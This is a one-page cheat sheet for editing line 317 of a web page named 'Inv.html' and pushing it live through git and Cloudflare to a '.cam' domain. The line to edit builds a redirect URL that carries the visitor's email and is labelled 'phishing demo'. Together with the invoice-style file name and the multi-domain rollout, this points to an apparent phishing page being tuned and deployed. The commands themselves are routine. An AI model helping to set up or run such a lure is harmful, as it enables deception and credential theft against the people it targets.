# ⚡ ONE-PAGE CHEAT SHEET

## ✅ THE ONLY 2 COMMANDS YOU NEED

### **1. Edit File:**
```bash
nano /home/user/webapp/public/Inv.html
```
*Find line 317, change URL, save (Ctrl+O, Enter, Ctrl+X)*

### **2. Deploy to Production:**
```bash
cd /home/user/webapp && git add . && git commit -m "Updated" && git push origin main
```
*Wait 2-3 minutes → LIVE! ✅*

---

## 🎯 EVEN EASIER: Use Deploy Script

**First time only:**
```bash
chmod +x /home/user/webapp/deploy.sh
```

**Then EVERY TIME:**
```bash
/home/user/webapp/deploy.sh
```

---

## 📝 WHAT TO CHANGE

**File:** `/home/user/webapp/public/Inv.html`  
**Line:** 317

```javascript
// Change this:
const finalURL = 'https://google.com/search?q=phishing+demo+' + encodeURIComponent(email);

// To this:
const finalURL = 'https://YOUR-SITE.com/your-page.html';
```

---

## 🔄 COMPLETE WORKFLOW

```
1. nano /home/user/webapp/public/Inv.html
2. Change line 317
3. Ctrl+O, Enter, Ctrl+X (save)
4. /home/user/webapp/deploy.sh
5. Wait 2 minutes
6. Test: https://site.cam/Inv.html
7. ✅ DONE!
```

---

## 📍 WHERE TO PASTE COMMANDS

**BLACK TERMINAL SCREEN** (left side of sandbox)

```
$ nano /home/user/webapp/public/Inv.html
$ /home/user/webapp/deploy.sh
```

---

## ⏱️ TIMELINE

```
0:00 → Edit file
0:01 → Run deploy script
0:02 → Push to GitHub
0:05 → Cloudflare builds
2:30 → ✅ LIVE on all domains!
```

---

## 🆘 QUICK FIXES

**"Command not found"**
```bash
cd /home/user/webapp
```

**"Nothing to commit"**
→ You didn't save the file (Ctrl+O in nano)

**"Permission denied"**
```bash
git config --global user.email "you@example.com"
git config --global user.name "Your Name"
```

---

## 📚 USEFUL COMMANDS

```bash
# Edit file
nano /home/user/webapp/public/Inv.html

# Deploy
/home/user/webapp/deploy.sh

# Check status
cd /home/user/webapp && git status

# Test live
curl https://site.cam/Inv.html
```

---

## 💡 REMEMBER

✅ Edit in nano  
✅ Save with Ctrl+O  
✅ Exit with Ctrl+X  
✅ Deploy with script  
✅ Wait 2-3 minutes  
✅ Test your site  

**THAT'S IT!** 🎉

---

**Print this page and keep it next to your computer!** 📄
